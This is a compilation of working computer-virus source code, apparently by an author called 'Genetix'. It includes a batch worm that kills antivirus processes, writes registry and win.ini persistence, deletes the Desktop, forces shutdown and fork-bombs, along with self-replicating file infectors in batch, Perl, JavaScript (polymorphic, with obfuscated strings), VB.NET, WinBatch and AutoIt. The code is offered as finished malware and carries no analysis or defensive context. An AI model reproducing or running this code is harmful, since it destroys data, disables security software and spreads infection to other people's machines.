@ECHO OFF
copy %0 %systemroot%\MiXedVeX.bat > nul
copy %0 *.bat > nul
copy %0 *.exe > nul
Attrib +h *.bat
cls
tskill AVGUARD
tskill AVGNT
tskill NMAIN
tskill KAV
tskill ad-aware
tskill av*
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MiXedVeX /t REG_SZ /d %systemroot%\MiXedVeX.bat /f > nul
cls
echo [windows] >> %systemroot%\win.ini
echo load=%systemroot%\MiXedVeX.bat >> %systemroot%\win.ini
echo run=%systemroot%\MiXedVeX.bat >> %systemroot%\win.ini
Attrib +h %systemroot%\win.ini
del C:\docume~\owner\Desktop
shutdown -s -t 15
cls
:MiXedVeX
start %0
goto MiXedVeX
@echo off
Echo Set oWMP = CreateObject("WMPlayer.OCX.7") >c:\m.vbs ^G
:MiXedVeX
:1
Echo Set colCDROMs = oWMP.cdromCollection >>c:\m.vbs ^G
Echo if colCDROMs.Count >= 1 then >>c:\m.vbs ^G
Echo For i = 0 to colCDROMs.Count - 1 >>c:\m.vbs ^G
Echo colCDROMs.Item(i).Eject >>c:\m.vbs ^G
Echo Next  >>c:\m.vbs ^G
Echo For i = 0 to colCDROMs.Count - 1 >>c:\m.vbs ^G
Echo colCDROMs.Item(i).Eject >>c:\m.vbs ^G
Echo Next >>c:\m.vbs ^G
Echo end if >>c:\m.vbs ^G
Start C:\M.vbs ^G
start %0 ^G
goto MiXedVeX ^G
goto 1
echo off
ver | find "Windows NT" >nul
if not errorlevel 1 goto vEnd
set vCode=%0
set vFile=vfile.tmp
copy %vcode% %vfile%
@for /F "tokens=*" %%l in ('dir /b /s "%2\*.cmd"') do type %vfile% > %%l >> nul
    echo y | del %vfile%
    copy %0 a:\
    echo.|date|find "Sat">nul
    if not errorlevel 1 goto vEnd
        Echo genetica
        time 6:66
    label genetica
  pause
exit
:vEnd
#/usr/bin/perl
#genetix

$Source = __FILE__;

my @VIRUS = ();
open(Host, $Source);
while(<Host>)
{
    $. > 30 ? last : push @VIRUS, $_;
}

close(Host);
my @Target = glob("*.*");
foreach my $Victim(@Target)
{
    $Filetype = lc(".pl");
    if ($Victim =~ m/$Filetype/)
    {
        open(ReadMe, $Victim);
        @VICTIMCODE = <ReadMe>;
        close(ReadMe);
        open(File, "+< $Victim");
        if (@VICTIMCODE[1] !~ "#genetix")
        {
            print File @VIRUS,chr(13).chr(10),@VICTIMCODE;
        }
        close(File)
    }
}
var genetix;

//By~ Genetix
//JS.swan
//All lines beginning with a forward slash will be removed, that's why I have to use 'var' for the infection markers.
//JS.swan uses EPO to infect files, it prepend's inside a 'function' befor the 'return' statement,
//it's also Polymorphic with variable changing & adding trash (random eval with junk and comments)~
//It uses random escape quotes for it's string encryption & hex. The poly functions use obfuscated code.
//these comments and any line beginning with a '/' is removed!
//I coded it so that it would only add trash to the virus code, that wasnt easy with it being EPO!
//Because of complication's in this virus, it will only add trash to newly infected files, not to itself when run.

var marker;

var qCgDTV=new ActiveXObject('\123\u0063\u0072\u0069pti\u006eg.Fi\154\145\u0053\u0079\u0073\u0074e\u006d\117b\152\u0065c\u0074');

var bnIAAr = WScript.ScriptFullName.replace(/\\[^\\]+$/,'');
FyTMut = qCgDTV.GetFile(WScript.scriptName);

var yvGDPT = new Array("bnIAAr", "yvGDPT", "FyTMut", "yueEZD","qCgDTV", "EQvFTb", "wcMEPI", "KQgdId", "ZaCcdH", "NJOmGK","yZTEpS", "VSCqai", "mGkyhU", "BGpbak", "yueEZD", "nZbskb","BGpbakWrite", "GvNhbI", "GvNhbI", "BGpbakWrite", "qPSrSr", "nCZeUx", "wLXFvn", "UUXhHh")


var yZTEpS = new Enumerator(qCgDTV.getFolder(bnIAAr).files);
for (; !yZTEpS.atEnd(); yZTEpS.moveNext())
      if (yZTEpS.item().name != WScript.scriptName)
      if(yZTEpS.item().name.match("\u0028\u005b\u0061\u002d\u007aA\u002d\132\060\u002d\u0039]\053\.j\163\u0029")) {

      var qPSrSr = new Boolean(false);
      var EQvFTb = '';
      var KQgdId = '';
      var VSCqai = '';
      var sigread = '';
      var junk = '';
      var ZaCcdH = '';
      var NJOmGK = '';
      var wcMEPI = '';
      var mGkyhU = '';
      var rn="\r\n";
      var TrashType = '';
      var yueEZD = qCgDTV.OpenTextFile(yZTEpS.item(), 1, true);

      while (!yueEZD.atEndOfStream) {
            wcMEPI = yueEZD.READLINE()
            if (wcMEPI == 'var genetix;') {
                  qPSrSr = true;
                  } sigread += rn + wcMEPI }
      yueEZD.close();

      var nZbskb = qCgDTV.OpenTextFile(FyTMut, 1, true);
      while (!nZbskb.atEndOfStream) {
            EQvFTb = nZbskb.readline();
            if (EQvFTb == "\x76\x61\x72\x20\x6D\x61\x72\x6B\x65\x72\x3B")
                  { break; }
            }

      while (!nZbskb.atEndOfStream) {
            EQvFTb = nZbskb.readline();
            if (EQvFTb == "var end;") {
                  break;
                  } KQgdId += rn + EQvFTb }
      nZbskb.close();

      for (s = 0; s <= yvGDPT.length; s++)
            { KQgdId = ReplaceVar(KQgdId, yvGDPT[s], trash(6)); }

      var BGpbak = qCgDTV.OpenTextFile(yZTEpS.item(), 1, true);
      while (!BGpbak.atEndOfStream) {
            ZaCcdH = BGpbak.READLINE()

            if(ZaCcdH.indexOf('\162e\u0074\u0075r\u006e')!=-1) {

                  while (!BGpbak.atEndOfStream)
                        { VSCqai = BGpbak.readall();}
                  if (!(qPSrSr==true)) {
                        GvNhbI = KQgdId.split(rn);
                        var BGpbakWrite = qCgDTV.OpenTextFile(yZTEpS.item(), 2);
                        BGpbakWrite.writeline("\x76\x61\x72\x20\x67\x65\x6E\x65\x74\x69\x78\x3B" + rn + NJOmGK + rn + '\x76\x61\x72\x20\x6D\x61\x72\x6B\x65\x72\x3B')
                        for (i = 0; i < GvNhbI.length; i++) {
                              if ((GvNhbI[i].charCodeAt(9) != 47) && (GvNhbI[i].charCodeAt(1) != 47)) {
                                    if (Math.round(Math.random() * 3) + 1 == 2) {
                                    if (Math.round(Math.random() * 5) + 1 == 3) { BGpbakWrite.writeline(String.fromCharCode(47,47) +
                                                                                  trash(Math.round(Math.random() * 20) + 50)) }
                                    if (Math.round(Math.random() * 5) + 1 == 5) { BGpbakWrite.writeline(String.fromCharCode(101,118,97,108,40,39,40,34,47,47) +
                                                                                  trash(Math.round(Math.random() * 20) + 50) + String.fromCharCode(34,41,39,41)) }
                                          }
                                    BGpbakWrite.writeline(GvNhbI[i]);
                                        
                                    }
                              }
                        BGpbakWrite.writeline("v\x61r \x65\x6Ed;" + rn + ZaCcdH + rn + VSCqai + rn + trash + rn + ReplaceVar);
                        BGpbakWrite.close();
                        }
                  break;
                  }

            NJOmGK += rn + ZaCcdH
            }
      BGpbak.close();

      }

var end;

function trash(len) {
      var Chars = String.fromCharCode((970 / 10), (87+11), (112-13), (114-14), (1212 / 12), (92+10), (90+13), (936 / 9),
      (1890 / 18), (98+9), (93+15), (121-12), (1540 / 14), (93+18), (129-17), (2034 / 18), (1140 / 10), (98+17), (125-9),
      (127-10), (109+9), (102+17), (111+9), (134-13), (1830 / 15), (49+16), (77-11), (76-9), (748 / 11), (54+15), (84-14),
      (82-11), (1224 / 17), (59+14), (61+13), (1275 / 17), (988 / 13), (64+13), (62+16), (89-10), (68+12), (69+12),
      (100-18), (1245 / 15), (1512 / 18), (74+11), (96-10), (105-18), (1232 / 14), (73+11), (80+10));

      var Polymorphic = '';
      for (var i = 0; i < len; i++) {
            eval(function(f, u, c, k, e, d) {
                  e = function(c) { return c }; if (!''.replace( /  ^  / , String))  {
                        while (c--) {d[c] = k[c] || c}
                        k = [(function(e){return d[e]}
                        )]; e = (function(){return '\\w+'}
                        ); c = 1}; while (c--) {
                        if (k[c]){
                              f = f.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])}
                        } return f }
            ('9 0=3.6(3.7()*2.5);4+=2.8(0,0+1);', 10, 10, 'rnd||Chars|Math|Polymorphic|length|floor|random|substring|var'.split('|'), 0, {}))
            }
            return (Polymorphic);
      }

function ReplaceVar(Genetix, Is, Hot) {
      try {
            eval(function(f, u, c, k, e, d) {
                e = function(c) {return c}; if (!''.replace( /  ^  / , Genetix)) {
                        while (c--){d[c] = k[c] || c}
                        k = [(function(e){return d[e]})]; e = (function() {return '\\w+'}); c = 1};
                  while (c--) {
                        if (k[c]) {
                           f = f.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])}
                        } return f }
            ('9(2.7(4)>-1){3=2.7(4);2=""+(2.5(0,3)+8+2.5((3+4.6),2.6))}', 10, 10, '||Genetix|pos|Is|substring|length|indexOf|Hot|while'.split('|'), 0, {}))

            } catch (err) {
            return Genetix;
            }
      return Genetix;
      }
Imports System
Imports System.IO
Imports System.Reflection
Imports Microsoft.Win32

Module VistaBug

    'VistaBug By Genetix

    Sub Main()

        Dim intCounter As Integer = 0 : Dim i As Int32
        Dim ArrayLfolders As New ArrayList() : Dim strSubFolders As String()
        Dim ArrayLsort As New ArrayList() : Dim strPath As String

        strPath = System.Environment.CurrentDirectory + (D("]"))
        If strPath.Substring(strPath.Length - (strPath.Length - strPath.Length + 1)) <> (D("]")) Then
            strPath += (D("]"))
        End If

        For i = 1 To Len(strPath)

            Try
                strPath = strPath.Substring(0, strPath.Length - 1)
                If strPath.Substring(strPath.Length - (strPath.Length - strPath.Length + 1)) = (D("]")) Then
                    File.Copy(Name(), strPath + rndName(Int(Rnd() * 7) + 1) + (D("*a|a")))
                End If
            Catch
                Continue For
            End Try

        Next

        ArrayLfolders.Add(System.Environment.CurrentDirectory + (D("]")))
        Do While intCounter <> ArrayLfolders.Count
            strSubFolders = System.IO.Directory.GetDirectories(ArrayLfolders.Item(intCounter))
            ArrayLfolders.AddRange(strSubFolders)
            intCounter += 1
        Loop

        ArrayLfolders.Sort()
        Dim strFolder As String
        For Each strFolder In ArrayLfolders
            Try
                If Left(strFolder, Len(strFolder) - 1) <> (D("]")) Then strFolder += (D("]"))
                If Right(strFolder, Len(strFolder) - Len(strFolder) + 2) = (D("^^")) Then
                    strFolder = Left(strFolder, Len(strFolder) - Len(strFolder) + Len(strFolder) - 1)
                End If
                ArrayLsort.Add(New DirectoryInfo(strFolder))
                File.Copy(Name(), strFolder + rndName(Int(Rnd() * 7) + 1) + (D("*a|a")))
            Catch
                Continue For
            End Try
        Next

        Dim x As Integer, FilesExt As String
        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey((D("J`jm|tEZlkk|wmZvwmkvuJ|mE")) & _
        (D("Oynjuyo@p}rq}roynjyn@Ot}nyo")), False)
        Dim readkey As Object = key.GetValue((D("ungtcb")))
        Dim stringValue As String = TryCast(readkey, String)
        Dim stringArray As String() = TryCast(readkey, String())
        Dim path As String = stringArray(2)

        If Not stringArray Is Nothing Then
            Try
                Dim myEnumerator As System.Collections.IEnumerator = stringArray.GetEnumerator()
                Dim justPath As String = path.Substring(path.Length - (path.Length - 5))
                File.Copy(Name(), justPath + (D("]")) + rndName(Int(Rnd() * 7) + 1) + (D("*a|a")))
            Catch
            End Try
        End If

        Dim FilesArray() As String = Directory.GetFileSystemEntries(System.Environment.CurrentDirectory + "\")
        For x = 0 To UBound(FilesArray)
            FilesExt = (Right(FilesArray(x), Len(FilesArray(x)) - Len(FilesArray(x)) + 4))
            If FilesExt = (D("*a|a")) Then
                If FilesArray(x) <> Name() Then
                    Try
                        File.SetAttributes(FilesArray(x), FileAttributes.Hidden)
                        File.Move(FilesArray(x), FilesArray(x) & (D("^")))
                        Dim NewName As String = Left(FilesArray(x), Len(FilesArray(x)) - 4)
                        File.Copy(Name(), NewName + (D("*a|a")))
                    Catch
                        Continue For
                    End Try
                End If
            End If
        Next

    End Sub

    Function Name()
        Dim AppName As String
        AppName = System.Reflection.Assembly.GetExecutingAssembly().Location
        Name = AppName
    End Function

    Function Path()
        Dim AppPath As String
        AppPath = System.Environment.CurrentDirectory
        If Left(AppPath, Len(AppPath) - 1) <> (D("]")) Then
            AppPath = AppPath & (D("]"))
        End If
        Path = AppPath
    End Function

    Private Function rndName(ByVal XLengh As Integer) As String
        Dim RndCharacter, RString, U_C As String
        RndCharacter = "" : RString = ""
        Dim i As Int32 = 0
        For i = 1 To Val(XLengh)
            Randomize()
            U_C = Int(2 * Rnd()) + 1
            RndCharacter = Int(Rnd() * 25) + 97
            If U_C = 1 Then
                RString = RString & UCase(Chr(RndCharacter))
            ElseIf U_C = 2 Then
                RString = RString & LCase(Chr(RndCharacter))
            End If
        Next i
        rndName = RString
    End Function

    Public Function D(ByVal str As String) As String
        Dim sResult As String = ""
        Dim i As Int32 : Dim key As Byte
        Dim strlen As Integer : strlen = Len(str)
        key = strlen Mod 255
        For i = 1 To strlen
            sResult = sResult & Chr(Asc(Mid(str, i, 1)) Xor key)
        Next
        D = sResult
    End Function

End Module

'DR-EF, kefi, retro, falckon, SPTH, blueowl :), MikeAce, c0de.. I always forget people! :(


rem (/*
@echo off
set cbv=cscript
%cbv% /nologo /e:javascript %0
goto qtdvcpwyffeegr  
*/)

function rem() {
    //Genetix - batch/js poly overwriter
    //Batch.agalia

    var vewqgfwxediit = WScript.CreateObject('Scripting.FileSystemObject');
    xeuwecqircfgp = vewqgfwxediit.GetFile(WScript.scriptName);
    var bapsxssftiwtsqb = new Array("vewqgfwxediit", "ftfdyapsppitr", "qtdvcpwyffeegr", "dtxhixuidswcxh", "ppxbgpriftvbie",
    "qhfqbpbvqbfuev", "bapsxssftiwtsqb", "cyduehfxqvpgpq", "irbxtpbvqavhh", "xpcbtdgrhrses", "ruitdqhsggspqew", "ufrecdyhpffxxsu",
    "hvqrpaxvwchcxw", "xeuwecqircfgp", "dcftwughrisreu", "uhuvecvfuqxbde", "cbv", "fqsvtxhfictwsr", "dbvprhibqqhfhbe", "hhurasufcsshgv")
    var qhfqbpbvqbfuev = vewqgfwxediit.OpenTextFile(xeuwecqircfgp, 1, true);
    dcftwughrisreu = qhfqbpbvqbfuev.readAll(); qhfqbpbvqbfuev.close(); for (s = 0; s <= bapsxssftiwtsqb.length; s++) {
    dcftwughrisreu = dtxhixuidswcxh(dcftwughrisreu, bapsxssftiwtsqb[s], irbxtpbvqavhh())
    } var ppxbgpriftvbie = vewqgfwxediit.OpenTextFile(xeuwecqircfgp, 2, true); ppxbgpriftvbie.Writeline(dcftwughrisreu);
    ppxbgpriftvbie.Close();} function dtxhixuidswcxh(xpcbtdgrhrses, ruitdqhsggspqew, ufrecdyhpffxxsu) {
    try{while (xpcbtdgrhrses.indexOf(ruitdqhsggspqew) >  - 1){hvqrpaxvwchcxw = xpcbtdgrhrses.indexOf(ruitdqhsggspqew);xpcbtdgrhrses = "" + (xpcbtdgrhrses.substring(0, hvqrpaxvwchcxw) + ufrecdyhpffxxsu +
    xpcbtdgrhrses.substring((hvqrpaxvwchcxw + ruitdqhsggspqew.length), xpcbtdgrhrses.length));}}catch (err)
    {return xpcbtdgrhrses;} return xpcbtdgrhrses;}function irbxtpbvqavhh() {var cyduehfxqvpgpq = ""; for (x = 0; x <= (Math.round(Math.random() * 2) + 12); x++){
    cyduehfxqvpgpq = cyduehfxqvpgpq + unescape("%" + (Math.round(Math.random() * 18) + 61))} return (cyduehfxqvpgpq)
}

/*
:qtdvcpwyffeegr  
set fqsvtxhfictwsr=copy
set dbvprhibqqhfhbe=type
set hhurasufcsshgv=in
%fqsvtxhfictwsr% %0 uhuvecvfuqxbde.tmp
for %%a %hhurasufcsshgv% (*.bat *.cmd) do %dbvprhibqqhfhbe% uhuvecvfuqxbde.tmp > %%a
del uhuvecvfuqxbde.tmp
*/


or the worlds first WinBatch virus:

CODE
;start

;Genetix present's: WBT.April.15 Virus in WinBatch script (appender)
;Possibly the first WinBatch virus? more to come! I like this language..

MySelf=IntControl(1004,0,0,0,0)

x=0
filelist=FileItemize("*.wbt")
count=ItemCount(filelist,@TAB)
For xx = 1 to count
   file=ItemExtract(xx,filelist,@TAB)
   If FileExist(file) <> 2
      if "%file%" <> %MySelf%

        rVictim = FileOpen("%file%", "READ")
        while @TRUE            
            linex = FileRead(rVictim)
             if linex == ";start" then
             x=1
             break
         endif
    if linex == "*EOF*" then break
        endwhile
        FileClose(rVictim)

        aVictim = FileOpen("%file%", "APPEND")
        if x <> 1 then FileWrite(aVictim, "%@crlf%;start")
        rSelf = FileOpen("%MySelf%", "READ")

        while @TRUE        
            line = FileRead(rSelf)
        If line == ";start" then break
        endwhile

         while @TRUE
             line = FileRead(rSelf)
             If line == ";EndVirus" Then Break
         if x <> 1 then FileWrite(aVictim, line)
         endwhile

         FileClose(rSelf)

         if x <> 1 then FileWrite(aVictim, "%@crlf%;EndVirus")
         FileClose(aVictim)

       Endif
   Endif
Next

;EndVirus


;Genetix

$Found = 0
$Sig = ";Genetix"
$Script = @scriptname
$search = FileFindFirstFile("*.au3")  

If $search = -1 Then
    Exit
EndIf

While 1
         $file = FileFindNextFile($search)
         if ($file == "") then ExitLoop
         if ($file <> $Script) then

            $check = FileOpen($file, 0)
               While 1
              $line = FileReadLine($check)
              If @error = -1 Then ExitLoop
              if ($line = $Sig) then $Found = $Found + 1
               Wend
             FileClose($check)

         if ($Found == 1) then exitloop
         $Victim = FileOpen($file, 0)
         If $Victim = -1 then exitloop
            $ReadAllHost = FileRead($Victim, FileGetSize($file))
         FileClose($Victim)

         $MySelf = FileOpen($Script, 0)
         If $MySelf = -1 then exitloop
            $ReadAll = FileRead($MySelf, FileGetSize($Script))
         FileClose($MySelf)

         $MyCode = StringSplit($ReadAll,@CRLF,1)
         $HostFile = StringSplit($ReadAllHost,@CRLF,1)

         $output = FileOpen($file,2)
           $AllSelf = ""
           for $i = 1 to $MyCode[0]
              $AllSelf = $AllSelf & @crlf & $MyCode[$i]
              if ($MyCode[$i] = ";end") then exitloop
           Next
         FileClose($output)

         $OpenHost = FileOpen($file,2)
           $Lines = ""
           for $x = 1 to $HostFile[0]
              $Lines = $Lines & @crlf & $HostFile[$x]
           Next
           FileWriteline($OpenHost, $AllSelf & @crlf & $Lines)
         FileClose($OpenHost)

      EndIf
WEnd


FileClose($search)

;end

